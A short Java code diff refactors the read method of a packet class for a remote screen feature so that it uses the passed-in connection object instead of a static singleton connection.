@@ -7,13 +7,13 @@ public class Packet12RemoteScreen extends AbstractIncomingPacket {
 	
 	@Override
 	public void read(Connection con) throws Exception {
-		int size = Connection.instance.readInt();
-		int quality = Connection.instance.readInt();
-		int monitor = Connection.instance.readInt();
-		int columns = Connection.instance.readInt();
-		int rows = Connection.instance.readInt();
+		int size = con.readInt();
+		int quality = con.readInt();
+		int monitor = con.readInt();
+		int columns = con.readInt();
+		int rows = con.readInt();
 		
-		new Screen(size, quality, monitor, columns, rows).start();
+		new Screen(con, size, quality, monitor, columns, rows).start();
 	}
 
 }
